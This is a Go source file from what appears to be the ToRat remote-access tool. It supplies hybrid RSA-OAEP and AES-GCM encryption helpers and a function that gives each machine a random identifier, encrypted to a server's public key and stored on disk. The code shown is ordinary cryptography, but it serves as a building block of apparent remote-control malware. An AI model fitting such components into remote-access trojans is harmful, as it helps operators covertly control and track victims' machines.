package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/gob"
	"io"
	"log"
	mathrand "math/rand"
	"os"

	"github.com/lu4p/ToRat/models"
)

// GenRandString generate a random string
func GenRandString() string {
	all := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 16)
	for i := range b {
		num := mathrand.Intn(len(all))
		b[i] = all[num]
	}
	return string(b)
}

// genHostname generates the Hostname of the machine
func genHostname(PubKey *rsa.PublicKey) models.EncAsym {
	hostname := GenRandString()
	return encAsym([]byte(hostname), PubKey)
}

// GetHostname returns the encrypted Hostname
// if Hostname is not set a new Hostname is generated
func GetHostname(path string, PubKey *rsa.PublicKey) models.EncAsym {
	encAsym, err := getEncodedFile(path)
	if err == nil {
		return encAsym
	}

	hostname := genHostname(PubKey)

	encodeToFile(hostname, path)

	return hostname
}

func encRsa(data []byte, RsaPublicKey *rsa.PublicKey) []byte {
	rand := rand.Reader
	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand, RsaPublicKey, data, nil)
	if err != nil {
		log.Println("Error from encryption:", err)
		return nil
	}
	return ciphertext
}

func getEncodedFile(path string) (models.EncAsym, error) {
	f, err := os.Open(path)
	if err != nil {
		return models.EncAsym{}, err
	}
	defer f.Close()

	decoder := gob.NewDecoder(f)
	var encAsym models.EncAsym
	decoder.Decode(&encAsym)
	return encAsym, nil
}

// encAsym encrypts data using RSA + AES to the publickey
// of the server
func encAsym(data []byte, pubKey *rsa.PublicKey) models.EncAsym {
	aeskey := genAesKey()
	encKey := encRsa(aeskey, pubKey)
	encData := encAes(data, aeskey)
	return models.EncAsym{
		EncAesKey: encKey,
		EncData:   encData,
	}
}

// encodeToFile encodes data using gob and writes the result to path
func encodeToFile(data models.EncAsym, path string) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}

	defer f.Close()

	encoder := gob.NewEncoder(f)
	return encoder.Encode(&data)
}

// genAesKey generates a 256bit AES Key
func genAesKey() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		log.Fatal("Fatal:", err)
	}
	return key
}

func encAes(data []byte, aesKey []byte) []byte {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		log.Fatal("Fatal:", err)
	}
	nonce := make([]byte, 12)
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		log.Fatal("Fatal:", err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal("Fatal:", err)
	}

	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
	encData := append(nonce, ciphertext...)
	return encData
}
